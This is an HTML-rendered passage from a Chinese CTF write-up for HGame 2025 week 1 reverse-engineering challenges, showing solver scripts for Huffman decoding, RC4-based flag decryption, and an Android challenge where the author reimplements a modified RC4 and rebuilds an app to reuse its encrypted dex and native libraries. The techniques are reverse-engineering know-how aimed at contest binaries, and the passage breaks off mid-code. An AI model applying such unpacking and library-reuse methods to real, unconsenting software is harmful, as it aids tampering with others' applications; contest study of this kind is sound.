<span class="keyword">return</span> parse_tree(huffman_tree)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_bits</span>(<span class="params">bits, decoder_tree</span>):</span><br><span class="line">    decoded = []</span><br><span class="line">    current = decoder_tree</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bits:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(current, <span class="built_in">int</span>):</span><br><span class="line">            decoded.append(current)</span><br><span class="line">            current = decoder_tree</span><br><span class="line">        current = current[bit]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(current, <span class="built_in">int</span>):</span><br><span class="line">        decoded.append(current)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(decoded)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">compressed_data</span>):</span><br><span class="line">    tree_json, bit_string = compressed_data.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    huffman_tree = json.loads(tree_json)</span><br><span class="line">    decoder_tree = build_decoder_tree(huffman_tree)</span><br><span class="line">    decoded = decode_bits(bit_string, decoder_tree)</span><br><span class="line">    <span class="keyword">return</span> decoded</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;enc.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    compressed_data = f.read()</span><br><span class="line">decompressed = decompress(compressed_data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompressed)</span><br><span class="line"><span class="built_in">print</span>(decompressed.decode())</span><br></pre></td></tr></table></figure><h3 id="Turtle">&gt; Turtle</h3><p>使用dbg脱upx（魔改过）</p><p>发现大跳转，打断点，fix后rebuild</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/datiaozhuan.png" alt="f074feb48adc6f1e5b696d6305874de8"></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/fix.png" alt="bdab6f5f942f8470a0c94a7544ef63f6"></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/ida.png" alt="image-20250206183018559"></p><p><code>sub_401550</code> 为 KSA<br>加密密钥为Buf2</p><p>解密key：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Buf2[<span class="number">0</span>] = <span class="number">-51</span>;</span><br><span class="line">Buf2[<span class="number">1</span>] = <span class="number">-113</span>;</span><br><span class="line">Buf2[<span class="number">2</span>] = <span class="number">37</span>;</span><br><span class="line">Buf2[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">Buf2[<span class="number">4</span>] = <span class="number">-31</span>;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_ksa</span>(<span class="params">key</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="comment"># 解密Key</span></span><br><span class="line">key_ksa = <span class="string">b&#x27;yekyek&#x27;</span></span><br><span class="line">cipher_key = <span class="built_in">bytes</span>([<span class="number">0xCD</span>, <span class="number">0x8F</span>, <span class="number">0x25</span>, <span class="number">0x3D</span>, <span class="number">0xE1</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>])</span><br><span class="line">s = rc4_ksa(key_ksa)</span><br><span class="line">key_stream = rc4_prga(s, <span class="built_in">len</span>(cipher_key))</span><br><span class="line">plain_key = <span class="built_in">bytes</span>([cipher_key[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Key: <span class="subst">&#123;plain_key&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>解密flag时的KSA用到 <code>Dest</code> ，也就是第一次rc4的key (plain_key)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_ksa</span>(<span class="params">key</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_prga</span>(<span class="params">s, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    s = s.copy()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        k = s[(s[i] + s[j]) % <span class="number">256</span>]</span><br><span class="line">        key_stream.append(k)</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密Key</span></span><br><span class="line">key_ksa = <span class="string">b&#x27;yekyek&#x27;</span></span><br><span class="line">cipher_key = <span class="built_in">bytes</span>([<span class="number">0xCD</span>, <span class="number">0x8F</span>, <span class="number">0x25</span>, <span class="number">0x3D</span>, <span class="number">0xE1</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>])</span><br><span class="line"></span><br><span class="line">s = rc4_ksa(key_ksa)</span><br><span class="line">key_stream = rc4_prga(s, <span class="built_in">len</span>(cipher_key))</span><br><span class="line">plain_key = <span class="built_in">bytes</span>([cipher_key[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Key: <span class="subst">&#123;plain_key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密Flag</span></span><br><span class="line">cipher_flag = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0xF8</span>, <span class="number">0xD5</span>, <span class="number">0x62</span>, <span class="number">0xCF</span>, <span class="number">0x43</span>, <span class="number">0xBA</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x4A</span>, <span class="number">0x51</span>, <span class="number">0x10</span>, <span class="number">0x27</span>, <span class="number">0x10</span>, <span class="number">0xB1</span>, <span class="number">0xCF</span>,</span><br><span class="line">    <span class="number">0xC4</span>, <span class="number">0x09</span>, <span class="number">0xFE</span>, <span class="number">0xE3</span>, <span class="number">0x9F</span>, <span class="number">0x49</span>, <span class="number">0x87</span>, <span class="number">0xEA</span>,</span><br><span class="line">    <span class="number">0x59</span>, <span class="number">0xC2</span>, <span class="number">0x07</span>, <span class="number">0x3B</span>, <span class="number">0xA9</span>, <span class="number">0x11</span>, <span class="number">0xC1</span>, <span class="number">0xBC</span>,</span><br><span class="line">    <span class="number">0xFD</span>, <span class="number">0x4B</span>, <span class="number">0x57</span>, <span class="number">0xC4</span>, <span class="number">0x7E</span>, <span class="number">0xD0</span>, <span class="number">0xAA</span>, <span class="number">0x0A</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">s_flag = rc4_ksa(plain_key)</span><br><span class="line">key_stream_flag = rc4_prga(s_flag, <span class="built_in">len</span>(cipher_flag))</span><br><span class="line">plain_flag = <span class="built_in">bytes</span>([(cipher_flag[i] + key_stream_flag[i]) % <span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;plain_flag.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="尊嘟假嘟">&gt; 尊嘟假嘟</h3><p>随便点点app发现在log里输出了，每次都是60字符，结尾大概率有“33”（最后发现是魔改base64换标然后把==替换成33了好像）</p><p><img src="hgame-wp-week1.assets%5C3817bcf401ef1e430d07d29ba1b9292f-20250206142939-rwraj1j.jpg" alt="3817bcf401ef1e430d07d29ba1b9292f">​</p><p>首先分析一下apk，有一个DexCall类，加载了两个so文件，并且用so处理并复制一个dex到私有路径并加载dex，调用一个方法后删除dex。</p><p><img src="hgame-wp-week1.assets%5Cimage-20250206140624-xt68dad.png" alt="jadx">​</p><p>还有个toast类，里面有个native的<strong>check</strong>方法<img src="hgame-wp-week1.assets%5Cimage-20250206141132-arnp78n.png" alt="jadx">​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> check(<span class="built_in">this</span>.mycontext, (String) DexCall.callDexMethod(<span class="built_in">this</span>.mycontext, <span class="built_in">this</span>.mycontext.getString(R.string.dex), <span class="built_in">this</span>.mycontext.getString(R.string.classname), <span class="built_in">this</span>.mycontext.getString(R.string.func1), s));</span><br><span class="line"><span class="comment">//这里的字符串都可以在resources.arsc里找到，</span></span><br></pre></td></tr></table></figure><p>比如<code>this.mycontext.getString(R.string.dex)</code>​在<code>resources.arsc</code>​里的<code>com.nobody.zunjia/string/string.xml</code>​</p><p><img src="hgame-wp-week1.assets%5Cf1f13781f468ed9332c823ace377f63b-20250206141620-qdm06gw.jpg" alt="mt管理器">​</p><p>复原后就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(String) DexCall.callDexMethod(<span class="string">&quot;zunjia.dex&quot;</span>，<span class="string">&quot;com.nobody.zundujiadu&quot;</span>, <span class="string">&quot;encode&quot;</span>, s);</span><br></pre></td></tr></table></figure><p>在apk里确实有<code>assets/zunjia.dex</code>​，但是格式错误，因为dex被加密，解密在zunjia.so里实现</p><p><img src="hgame-wp-week1.assets%5Cimage-20250206142329-c6pld1m.png" alt="ida">​</p><p>这里暂时没必要分析，只需要知道zunjia,so用于解密dex即可。</p><p>那么显然check函数是关键，在check.so里实现，，注意一点传入的字符串先经过dex加密了一次。</p><p><a href="http://xn--check-zh6hs00k.so">分析check.so</a></p><p><img src="hgame-wp-week1.assets%5Cimage-20250206142802-qc9gcwl.png" alt="image">​</p><p><img src="hgame-wp-week1.assets%5Cimage-20250206142823-mz8dzhi.png" alt="image">​</p><p><img src="hgame-wp-week1.assets%5C5fe3e77b428470ace2ddce2bc8915ef1-20250206150300-b8errak.png" alt="5fe3e77b428470ace2ddce2bc8915ef1">​</p><p>找到加密的地方了，这里标出了encode的函数，以及密文</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x7A</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0x94</span>, <span class="number">0x51</span>, <span class="number">0x82</span>, <span class="number">0xF5</span>, <span class="number">0x99</span>, <span class="number">0x0C</span>, <span class="number">0x30</span>, <span class="number">0xC8</span>, <span class="number">0xCD</span>, <span class="number">0x97</span>, <span class="number">0xFE</span>, <span class="number">0x3D</span>, <span class="number">0xD2</span>, <span class="number">0xAE</span>, <span class="number">0x0E</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x87</span>, <span class="number">0xBB</span>, <span class="number">0xC6</span>, <span class="number">0x35</span>, <span class="number">0xE1</span>, <span class="number">0x8C</span>, <span class="number">0x59</span>, <span class="number">0xEF</span>, <span class="number">0xAD</span>, <span class="number">0xFA</span>, <span class="number">0x94</span>, <span class="number">0x74</span>, <span class="number">0xD3</span>, <span class="number">0x42</span>, <span class="number">0x27</span>, <span class="number">0x98</span>, <span class="number">0x77</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x46</span>, <span class="number">0x5E</span>, <span class="number">0x95</span>]</span><br></pre></td></tr></table></figure><p>首先用传参处理固定key，然后用key处理(解密)一段字符，最后再调用dex的encode方法将结果log输出。</p><p>将他转换成py就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">a1, keys</span>):</span><br><span class="line">    a_len = <span class="built_in">len</span>(a1)</span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    a1_bytes = <span class="built_in">bytearray</span>(a1) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a_len):</span><br><span class="line">        v6 = (v6 + keys[v6 + <span class="number">1</span>]) % <span class="number">256</span> </span><br><span class="line">        keys[v6], keys[v5] = keys[v5], keys[v6]  </span><br><span class="line">        a1_bytes[i] ^= keys[(keys[v6] + keys[v5]) % <span class="number">256</span>]</span><br><span class="line">    a1_list = <span class="built_in">list</span>(a1_bytes)</span><br><span class="line">    a1_modified = <span class="built_in">bytes</span>(a1_bytes)</span><br><span class="line">    <span class="keyword">return</span> a1_list </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enkeys</span>(<span class="params">a1</span>):</span><br><span class="line">    keys = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    result = <span class="built_in">len</span>(a1) </span><br><span class="line">    var1 = <span class="built_in">bytearray</span>(<span class="number">256</span>) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        var1[j] = <span class="built_in">ord</span>(a1[j % result])  </span><br><span class="line">    var2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        var3 = (var2 + keys[k] + var1[k]) &amp; <span class="number">0xFF</span></span><br><span class="line">        var2 = var3</span><br><span class="line">        keys[k], keys[var3] = keys[var3], keys[k]</span><br><span class="line">    <span class="keyword">return</span> keys  </span><br></pre></td></tr></table></figure><p>于是我们就理清了加密逻辑，输入-&gt;调dex函数-&gt;so加密密钥-&gt;so魔改rc4-&gt;调dex函数</p><p>由于check函数不check，我们就需要自己爆破了</p><p>由题目可知，是0.o和o.0的组合，最大不超过36个字符，只需要模拟它的加密过程并判断有没有hgame开头的flag即可</p><p>‍</p><p>这里dex加密还没解决，于是我突发奇想，用相同包名，复制它的代码，自己写个app即可调用dex方法。</p><p>包名用<code>com.nobody.zunjia</code>​，将dex和so放在assets和jniLibs里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">│  AndroidManifest.xml</span><br><span class="line">│</span><br><span class="line">├─assets</span><br><span class="line">│      zunjia.dex</span><br><span class="line">│</span><br><span class="line">├─java</span><br><span class="line">│  └─com</span><br><span class="line">│      └─nobody</span><br><span class="line">│          └─zunjia</span><br><span class="line">│                  DexCall.java</span><br><span class="line">│                  Encoder.java</span><br><span class="line">│                  MainActivity.java</span><br><span class="line">│                  toast.java</span><br><span class="line">│</span><br><span class="line">├─jniLibs</span><br><span class="line">│  ├─arm64-v8a</span><br><span class="line">│  │      libcheck.so</span><br><span class="line">│  │      libzunjia.so</span><br><span class="line">│  │</span><br><span class="line">│  ├─armeabi-v7a</span><br><span class="line">│  │      libcheck.so</span><br><span class="line">│  │      libzunjia.so</span><br><span class="line">│  │</span><br><span class="line">│  ├─x86</span><br><span class="line">│  │      libcheck.so</span><br><span class="line">│  │      libzunjia.so</span><br><span class="line">│  │</span><br><span class="line">│  └─x86_64</span><br><span class="line">│          libcheck.so</span><br><span class="line">│          libzunjia.so</span><br></pre></td></tr></table></figure><p>这里我们用java实现一些上述python的算法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nobody.zunjia;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Encoder</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现加密功能，使用 RC4 算法的 PRGA 部分</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] encode(List&lt;Integer&gt; a1, List&lt;Integer&gt; keys) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">aLen</span> <span class="operator">=</span> a1.size();</span><br><span class="line">        <span class="comment">// 初始化 PRGA 中的 i 和 j</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将输入的整数列表转换为字节列表，便于后续操作</span></span><br><span class="line">        List&lt;Byte&gt; a1Bytes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> val : a1) &#123;</span><br><span class="line">            a1Bytes.add((<span class="type">byte</span>) val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历输入的每个字节</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; aLen; index++) &#123;</span><br><span class="line">            <span class="comment">// 更新 i 的值，确保在 0 - 255 范围内</span></span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            <span class="comment">// 更新 j 的值，确保在 0 - 255 范围内</span></span><br><span class="line">            j = (j + keys.get(i)) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 交换 keys[i] 和 keys[j] 的值</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> keys.get(i);</span><br><span class="line">            keys.set(i, keys.get(j));</span><br><span class="line">            keys.set(j, temp);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 计算异或操作的索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">xorIndex</span> <span class="operator">=</span> (keys.get(i) + keys.get(j)) % <span class="number">256</span>;</span><br><span class="line">            <span class="comment">// 对当前字节进行异或操作</span></span><br><span class="line">            <span class="type">byte</span> <span class="variable">xorResult</span> <span class="operator">=</span> (<span class="type">byte</span>) (a1Bytes.get(index) ^ keys.get(xorIndex));</span><br><span class="line">            <span class="comment">// 更新当前字节的值</span></span><br><span class="line">            a1Bytes.set(index, xorResult);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将字节列表转换为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] byteArray = <span class="keyword">new</span> <span class="title class_">byte</span>[a1Bytes.size()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; a1Bytes.size(); index++) &#123;</span><br><span class="line">            byteArray[index] = a1Bytes.get(index);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> byteArray;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现 RC4 算法的 KSA 部分，生成初始的密钥流</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title function_">enkeys</span><span class="params">(String a1)</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化密钥列表，范围从 0 到 255</span></span><br><span class="line">        List&lt;Integer&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            keys.add(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 j 的值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 获取密钥字符串的长度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">keyLength</span> <span class="operator">=</span> a1.length();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历 0 到 255 的索引</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// 更新 j 的值，确保在 0 - 255 范围内</span></span><br><span class="line">            j = (j + keys.get(i) + (a1.charAt(i % keyLength) &amp; <span class="number">0xFF</span>)) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 交换 keys[i] 和 keys[j] 的值</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> keys.get(i);</span><br><span class="line">            keys.set(i, keys.get(j));</span><br><span class="line">            keys.set(j, temp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> keys;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优化一下dexcall类，防止爆破时候爆缓存，只读取和解密一次dex。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nobody.zunjia;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DexCall</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File dexFile;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DexClassLoader dexClassLoader;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">native</span> File <span class="title function_">copyDexFromAssets</span><span class="params">(Context context, String str, File file)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;zunjia&quot;</span>);</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;check&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(Context context, String dexFileName)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dexDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getCacheDir(), <span class="string">&quot;dex&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (dexDir.mkdir() || dexDir.setWritable(<span class="literal">true</span>)) &#123;</span><br><span class="line">            dexFile = copyDexFromAssets(context, dexFileName, dexDir);</span><br><span class="line">            <span class="keyword">if</span> (dexFile != <span class="literal">null</span> &amp;&amp; dexFile.exists() &amp;&amp; dexFile.setReadOnly()) 